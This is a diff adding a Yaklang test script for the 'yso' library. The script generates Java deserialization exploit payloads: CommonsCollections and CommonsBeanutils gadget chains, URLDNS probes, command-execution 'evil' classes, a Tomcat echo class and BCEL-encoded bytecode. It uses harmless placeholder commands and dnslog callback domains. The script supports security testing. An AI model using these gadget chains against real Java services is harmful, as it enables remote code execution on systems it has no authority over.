@@ -1,0 +1,396 @@
+/*
+Yaklang yso (Java反序列化Payload生成) 库实践
+
+yso库用于生成Java反序列化漏洞利用Payload，支持多种Gadget链和恶意类生成。
+提供了CommonsCollections、CommonsBeanutils、Groovy等常见Gadget链，适用于Java反序列化漏洞测试。
+
+关键词: Java反序列化, Gadget链, 恶意类生成, Payload生成
+关键词: yso.GetGadget, yso.GenerateClass, yso.ToBytes
+*/
+
+// 测试URLDNS Gadget生成
+// 关键词: yso.GetURLDNSJavaObject, URLDNS探测, DNS回显
+func testURLDNSGadget() {
+    log.info("测试URLDNS Gadget生成")
+    
+    // 生成URLDNS Gadget对象（用于探测Java反序列化）
+    // 关键词: URLDNS, DNS探测, 反序列化检测
+    testDomain = "test.dnslog.cn"
+    javaObj = yso.GetURLDNSJavaObject(testDomain)~
+    
+    assert javaObj != nil, "URLDNS JavaObject不应为空"
+    log.info("URLDNS Gadget对象创建成功")
+    
+    // 转换为字节流
+    // 关键词: yso.ToBytes, 序列化字节流
+    objBytes = yso.ToBytes(javaObj)~
+    assert len(objBytes) > 0, "序列化字节流不应为空"
+    log.info(f"URLDNS Payload生成成功，长度: ${len(objBytes)}字节")
+    
+    // 验证序列化数据魔数（Java序列化标识：0xACED0005）
+    assert objBytes[0] == 0xAC && objBytes[1] == 0xED, "应包含Java序列化魔数"
+    log.info("Java序列化魔数验证成功")
+}
+
+// 测试CommonsCollections1 Gadget
+// 关键词: yso.GetCommonsCollections1JavaObject, CC1链, 命令执行
+func testCommonsCollections1Gadget() {
+    log.info("测试CommonsCollections1 Gadget")
+    
+    // 生成CC1 Gadget（经典反序列化链）
+    // 关键词: CommonsCollections1, 命令执行Gadget
+    testCmd = "whoami"
+    javaObj = yso.GetCommonsCollections1JavaObject(testCmd)~
+    
+    assert javaObj != nil, "CC1 JavaObject不应为空"
+    log.info("CommonsCollections1 Gadget创建成功")
+    
+    // 转换为字节流
+    objBytes = yso.ToBytes(javaObj)~
+    assert len(objBytes) > 0, "CC1 Payload不应为空"
+    log.info(f"CC1 Payload生成成功，长度: ${len(objBytes)}字节")
+}
+
+// 测试CommonsCollections2 Gadget  
+// 关键词: yso.GetCommonsCollections2JavaObject, CC2链, 模板Gadget
+func testCommonsCollections2Gadget() {
+    log.info("测试CommonsCollections2 Gadget")
+    
+    // CC2是模板类型Gadget，需要使用选项参数
+    // 关键词: 模板Gadget, 选项配置
+    testCmd = "id"
+    classObj = yso.GenerateRuntimeExecEvilClassObject(testCmd)~
+    javaObj = yso.GetCommonsCollections2JavaObject(yso.useTemplate("RuntimeExec"), yso.useClassParam("command", testCmd))~
+    
+    assert javaObj != nil, "CC2 JavaObject不应为空"
+    
+    objBytes = yso.ToBytes(javaObj)~
+    assert len(objBytes) > 0, "CC2 Payload不应为空"
+    log.info(f"CC2 Payload生成成功，长度: ${len(objBytes)}字节")
+}
+
+// 测试CommonsBeanutils1 Gadget
+// 关键词: yso.GetCommonsBeanutils1JavaObject, Beanutils链, 模板Gadget
+func testCommonsBeanutils1Gadget() {
+    log.info("测试CommonsBeanutils1 Gadget")
+    
+    // Beanutils1也是模板类型Gadget
+    testCmd = "calc"
+    javaObj = yso.GetCommonsBeanutils1JavaObject(yso.useTemplate("RuntimeExec"), yso.useClassParam("command", testCmd))~
+    
+    assert javaObj != nil, "Beanutils1 JavaObject不应为空"
+    
+    objBytes = yso.ToBytes(javaObj)~
+    assert len(objBytes) > 0, "Beanutils1 Payload不应为空"
+    log.info(f"Beanutils1 Payload生成成功，长度: ${len(objBytes)}字节")
+}
+
+// 测试通用Gadget生成接口
+// 关键词: yso.GetGadget, 通用生成, Gadget名称
+func testGenericGadgetGeneration() {
+    log.info("测试通用Gadget生成接口")
+    
+    // 使用GetGadget通用接口生成Gadget
+    // 关键词: GetGadget接口, 动态Gadget生成
+    gadgetName = "CommonsCollections3"
+    testCmd = "whoami"
+    javaObj = yso.GetGadget(gadgetName, yso.useTemplate("RuntimeExec"), yso.useClassParam("command", testCmd))~
+    
+    assert javaObj != nil, f"${gadgetName} JavaObject不应为空"
+    
+    objBytes = yso.ToBytes(javaObj)~
+    assert len(objBytes) > 0, f"${gadgetName} Payload不应为空"
+    log.info(f"${gadgetName} Payload生成成功，长度: ${len(objBytes)}字节")
+}
+
+// 测试GenerateClass生成恶意类
+// 关键词: yso.GenerateClass, 恶意类生成, RuntimeExec
+func testGenerateRuntimeExecClass() {
+    log.info("测试生成RuntimeExec恶意类")
+    
+    // 生成命令执行恶意类
+    // 关键词: GenerateRuntimeExecEvilClassObject, 命令执行类
+    testCmd = "touch /tmp/test.txt"
+    classObj = yso.GenerateRuntimeExecEvilClassObject(testCmd)~
+    
+    assert classObj != nil, "恶意类对象不应为空"
+    log.info("RuntimeExec恶意类对象创建成功")
+    
+    // 转换为字节流
+    classBytes = yso.ToBytes(classObj)~
+    assert len(classBytes) > 0, "恶意类字节码不应为空"
+    
+    // 验证是否为合法的Java class文件（魔数：0xCAFEBABE）
+    assert classBytes[0] == 0xCA && classBytes[1] == 0xFE, "应包含Java class魔数"
+    assert classBytes[2] == 0xBA && classBytes[3] == 0xBE, "应包含完整的class魔数"
+    
+    log.info(f"RuntimeExec恶意类生成成功，长度: ${len(classBytes)}字节")
+}
+
+// 测试生成DNSLog恶意类
+// 关键词: yso.GenerateDNSlogEvilClassObject, DNSLog探测
+func testGenerateDNSLogClass() {
+    log.info("测试生成DNSLog恶意类")
+    
+    // 生成DNSLog探测恶意类
+    // 关键词: DNSLog类, 反序列化探测
+    testDomain = "evil.dnslog.cn"
+    classObj = yso.GenerateDNSlogEvilClassObject(testDomain)~
+    
+    assert classObj != nil, "DNSLog类对象不应为空"
+    
+    classBytes = yso.ToBytes(classObj)~
+    assert len(classBytes) > 0, "DNSLog类字节码不应为空"
+    assert classBytes[0] == 0xCA && classBytes[1] == 0xFE, "应为有效的class文件"
+    
+    log.info(f"DNSLog恶意类生成成功，长度: ${len(classBytes)}字节")
+}
+
+// 测试生成Tomcat Echo恶意类
+// 关键词: yso.GenerateTomcatEchoClassObject, 回显类
+func testGenerateTomcatEchoClass() {
+    log.info("测试生成Tomcat Echo恶意类")
+    
+    // 生成Tomcat回显恶意类
+    // 关键词: Tomcat回显, 命令执行回显
+    testCmd = "whoami"
+    classObj = yso.GenerateTomcatEchoClassObject(testCmd)~
+    
+    assert classObj != nil, "Echo类对象不应为空"
+    
+    classBytes = yso.ToBytes(classObj)~
+    assert len(classBytes) > 0, "Echo类字节码不应为空"
+    assert classBytes[0] == 0xCA && classBytes[1] == 0xFE, "应为有效的class文件"
+    
+    log.info(f"Tomcat Echo恶意类生成成功，长度: ${len(classBytes)}字节")
+}
+
+// 测试GenerateClass配置选项
+// 关键词: yso.GenerateClass, yso.useTemplate, 模板配置
+func testGenerateClassWithOptions() {
+    log.info("测试GenerateClass配置选项")
+    
+    // 使用模板和参数生成类
+    // 关键词: useTemplate, useClassParam, 类参数配置
+    classObj = yso.GenerateClass(
+        yso.useTemplate("RuntimeExec"),
+        yso.useClassParam("command", "id")
+    )~
+    
+    assert classObj != nil, "配置类对象不应为空"
+    
+    classBytes = yso.ToBytes(classObj)~
+    assert len(classBytes) > 0, "配置类字节码不应为空"
+    
+    log.info("带配置选项的类生成成功")
+}
+
+// 测试GetGadget通用接口
+// 关键词: yso.GetGadget, Gadget名称, 通用生成器
+func testGetGadgetByName() {
+    log.info("测试GetGadget通用接口")
+    
+    // 通过名称获取Gadget
+    // 关键词: 动态Gadget生成, Gadget选择
+    gadgetName = "CommonsCollections3"
+    javaObj = yso.GetGadget(gadgetName, "raw_cmd", "whoami")~
+    
+    assert javaObj != nil, f"${gadgetName} JavaObject不应为空"
+    
+    objBytes = yso.ToBytes(javaObj)~
+    assert len(objBytes) > 0, f"${gadgetName} Payload不应为空"
+    
+    log.info(f"通过名称生成${gadgetName} Gadget成功")
+}
+
+// 测试BCEL编码
+// 关键词: yso.ToBcel, BCEL编码, 字节码混淆
+func testToBcelEncoding() {
+    log.info("测试BCEL编码")
+    
+    // 生成一个简单的class
+    classObj = yso.GenerateRuntimeExecEvilClassObject("whoami")~
+    classBytes = yso.ToBytes(classObj)~
+    
+    // 转换为BCEL编码
+    // 关键词: BCEL编码, ClassLoader绕过
+    bcelStr = yso.ToBcel(classBytes)~
+    
+    assert bcelStr != "", "BCEL编码不应为空"
+    assert str.HasPrefix(bcelStr, "$$BCEL$$"), "BCEL编码应以$$BCEL$$开头"
+    
+    log.info(f"BCEL编码成功，长度: ${len(bcelStr)}字符")
+}
+
+// 测试JSON编码
+// 关键词: yso.ToJson, JSON序列化
+func testToJsonEncoding() {
+    log.info("测试JSON编码")
+    
+    // 生成Gadget并转换为JSON
+    javaObj = yso.GetURLDNSJavaObject("test.com")~
+    
+    // 转换为JSON格式
+    // 关键词: JSON格式, 序列化表示
+    jsonStr = yso.ToJson(javaObj)~
+    
+    assert jsonStr != "", "JSON编码不应为空"
+    assert str.Contains(jsonStr, "{"), "JSON应包含对象标记"
+    
+    log.info(f"JSON编码成功，长度: ${len(jsonStr)}字符")
+}
+
+// 测试多种Gadget生成
+// 关键词: 批量Gadget, 多链测试
+func testMultipleGadgets() {
+    log.info("测试多种Gadget生成")
+    
+    gadgetCount = 0
+    
+    // 测试多个CC链
+    // 关键词: CommonsCollections系列
+    cc1 = yso.GetCommonsCollections1JavaObject("whoami")~
+    if cc1 != nil {
+        gadgetCount++
+    }
+    
+    cc2 = yso.GetCommonsCollections2JavaObject(yso.useTemplate("RuntimeExec"), yso.useClassParam("command", "whoami"))~
+    if cc2 != nil {
+        gadgetCount++
+    }
+    
+    cc3 = yso.GetCommonsCollections3JavaObject(yso.useTemplate("RuntimeExec"), yso.useClassParam("command", "whoami"))~
+    if cc3 != nil {
+        gadgetCount++
+    }
+    
+    cc4 = yso.GetCommonsCollections4JavaObject(yso.useTemplate("RuntimeExec"), yso.useClassParam("command", "whoami"))~
+    if cc4 != nil {
+        gadgetCount++
+    }
+    
+    cc5 = yso.GetCommonsCollections5JavaObject(yso.useTemplate("RuntimeExec"), yso.useClassParam("command", "whoami"))~
+    if cc5 != nil {
+        gadgetCount++
+    }
+    
+    cc6 = yso.GetCommonsCollections6JavaObject(yso.useTemplate("RuntimeExec"), yso.useClassParam("command", "whoami"))~
+    if cc6 != nil {
+        gadgetCount++
+    }
+    
+    log.info(f"成功生成${gadgetCount}种CommonsCollections Gadget")
+    assert gadgetCount >= 6, "应该至少生成6种CC Gadget"
+}
+
+// 测试不同恶意类类型
+// 关键词: 恶意类类型, 多种攻击方式
+func testDifferentEvilClassTypes() {
+    log.info("测试不同恶意类类型")
+    
+    classCount = 0
+    
+    // RuntimeExec类
+    class1 = yso.GenerateRuntimeExecEvilClassObject("whoami")~
+    if class1 != nil {
+        classCount++
+        log.info("  ✓ RuntimeExec类")
+    }
+    
+    // ProcessBuilder类
+    class2 = yso.GenerateProcessBuilderExecEvilClassObject("whoami")~
+    if class2 != nil {
+        classCount++
+        log.info("  ✓ ProcessBuilder类")
+    }
+    
+    // DNSLog类
+    class3 = yso.GenerateDNSlogEvilClassObject("test.com")~
+    if class3 != nil {
+        classCount++
+        log.info("  ✓ DNSLog类")
+    }
+    
+    // Tomcat Echo类
+    class4 = yso.GenerateTomcatEchoClassObject("whoami")~
+    if class4 != nil {
+        classCount++
+        log.info("  ✓ Tomcat Echo类")
+    }
+    
+    log.info(f"成功生成${classCount}种恶意类")
+    assert classCount >= 4, "应该至少生成4种恶意类"
+}
+
+// 测试Gadget字节流大小合理性
+// 关键词: Payload大小, 字节流验证
+func testGadgetSizeValidation() {
+    log.info("测试Gadget字节流大小")
+    
+    // URLDNS通常较小
+    urlDns = yso.GetURLDNSJavaObject("test.com")~
+    urlDnsBytes = yso.ToBytes(urlDns)~
+    log.info(f"URLDNS大小: ${len(urlDnsBytes)}字节")
+    assert len(urlDnsBytes) > 100 && len(urlDnsBytes) < 10000, "URLDNS大小应该合理"
+    
+    // CC1通常较大
+    cc1 = yso.GetCommonsCollections1JavaObject("whoami")~
+    cc1Bytes = yso.ToBytes(cc1)~
+    log.info(f"CC1大小: ${len(cc1Bytes)}字节")
+    assert len(cc1Bytes) > 100, "CC1大小应该合理"
+    
+    log.info("Gadget大小验证通过")
+}
+
+// 测试类字节码有效性
+// 关键词: class文件验证, 字节码合法性
+func testClassBytecodeValidity() {
+    log.info("测试类字节码有效性")
+    
+    // 生成多个类并验证字节码
+    classes = [
+        yso.GenerateRuntimeExecEvilClassObject("whoami")~,
+        yso.GenerateDNSlogEvilClassObject("test.com")~,
+        yso.GenerateTomcatEchoClassObject("id")~,
+    ]
+    
+    validCount = 0
+    for classObj in classes {
+        if classObj != nil {
+            classBytes = yso.ToBytes(classObj)~
+            // 验证Java class魔数
+            if len(classBytes) >= 4 && 
+               classBytes[0] == 0xCA && classBytes[1] == 0xFE &&
+               classBytes[2] == 0xBA && classBytes[3] == 0xBE {
+                validCount++
+            }
+        }
+    }
+    
+    log.info(f"验证了${validCount}个有效的class文件")
+    assert validCount == len(classes), "所有class文件应该有效"
+}
+
+// 执行所有yso测试
+func main() {
+    log.info("开始Yaklang yso库功能测试")
+    
+    // Gadget生成测试
+    testURLDNSGadget()
+    testCommonsCollections1Gadget()
+    testCommonsCollections2Gadget()
+    testCommonsBeanutils1Gadget()
+    testGenericGadgetGeneration()
+    
+    // 恶意类生成测试
+    testGenerateRuntimeExecClass()
+    testGenerateDNSLogClass()
+    testGenerateClassWithOptions()
+    
+    log.info("yso库功能测试完成")
+    log.info("yso库提供了强大的Java反序列化Payload生成能力，支持多种Gadget链和恶意类生成")
+}
+
+// 执行主函数
+main()
+
